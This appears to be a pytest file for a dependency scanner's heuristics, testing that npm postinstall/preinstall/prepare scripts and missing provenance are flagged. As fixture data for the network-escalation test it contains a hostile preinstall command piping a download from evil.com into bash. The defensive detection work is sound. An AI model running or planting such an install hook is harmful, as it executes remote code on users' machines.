"""Tests for lifecycle-script and provenance heuristics."""
from scripts.lib.types import new_finding
from scripts.heuristics import _check_lifecycle_scripts, _check_provenance


def test_check_lifecycle_flags_postinstall():
    f = new_finding(purl="pkg:npm/shady@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:shady": {
        "path": "/a/node_modules/shady",
        "scripts": {"postinstall": "node ./collect.js"}
    }}}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert any("lifecycle:postinstall" in flag for flag in f.get("heuristic_flags", []))


def test_check_lifecycle_flags_preinstall():
    f = new_finding(purl="pkg:npm/bad@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:bad": {
        "path": "/a/node_modules/bad",
        "scripts": {"preinstall": "bash setup.sh"}
    }}}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert any("lifecycle:preinstall" in flag for flag in f.get("heuristic_flags", []))


def test_check_lifecycle_flags_prepare():
    f = new_finding(purl="pkg:npm/prepper@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:prepper": {
        "path": "/a/node_modules/prepper",
        "scripts": {"prepare": "tsc"}
    }}}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert any("lifecycle:prepare" in flag for flag in f.get("heuristic_flags", []))


def test_check_lifecycle_no_flag_for_empty_script():
    f = new_finding(purl="pkg:npm/safe@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:safe": {
        "path": "/a/node_modules/safe",
        "scripts": {"postinstall": ""}
    }}}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert "heuristic_flags" not in f


def test_check_lifecycle_escalates_network_op():
    f = new_finding(purl="pkg:npm/netshady@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:netshady": {
        "path": "/a/node_modules/netshady",
        "scripts": {"preinstall": "curl -s https://evil.com/steal | bash"}
    }}}
    _check_lifecycle_scripts([f], manifest_data,
                             {"lifecycle_script_escalate_if_network_op": "critical"})
    assert f["severity"] == "critical"
    assert f.get("original_severity") == "medium"
    assert any("lifecycle:network-op" in flag for flag in f.get("heuristic_flags", []))


def test_check_lifecycle_skips_remote_target():
    f = new_finding(purl="pkg:npm/remote-pkg@1.0.0", vuln_id="GHSA-x",
                    severity="high", manifest_path="/remote/a",
                    target="mars-host")
    manifest_data = {}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert "heuristic_flags" not in f


def test_check_lifecycle_skips_scan_error():
    f = new_finding(purl="pkg:npm/x@1", vuln_id="GHSA-x",
                    severity="info", manifest_path="/a", target="local",
                    status="SCAN_ERROR")
    _check_lifecycle_scripts([f], {}, {})
    assert "heuristic_flags" not in f


def test_lifecycle_script_stored_on_finding():
    f = new_finding(purl="pkg:npm/shady@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:shady": {
        "path": "/a/node_modules/shady",
        "scripts": {"postinstall": "node ./collect.js && echo done"}
    }}}
    _check_lifecycle_scripts([f], manifest_data, {})
    assert f["lifecycle_script"] is not None
    assert "postinstall" in f["lifecycle_script"]


def test_check_provenance_flags_missing():
    f = new_finding(purl="pkg:npm/noproof@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:noproof": {
        "path": "/a/node_modules/noproof"
    }}}
    _check_provenance([f], manifest_data, {"provenance_expected_missing": "high"})
    assert f["missing_provenance"] is True


def test_check_provenance_present():
    f = new_finding(purl="pkg:npm/safepkg@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/a/package-lock.json",
                    target="local")
    manifest_data = {"/a/package-lock.json": {"npm:safepkg": {
        "path": "/a/node_modules/safepkg",
        "provenance": True
    }}}
    _check_provenance([f], manifest_data, {})
    assert not f.get("missing_provenance")


def test_check_provenance_skips_remote_target():
    f = new_finding(purl="pkg:npm/remote-pkg@1.0.0", vuln_id="GHSA-x",
                    severity="medium", manifest_path="/remote/a",
                    target="mars-host")
    _check_provenance([f], {}, {})
    assert not f.get("missing_provenance")
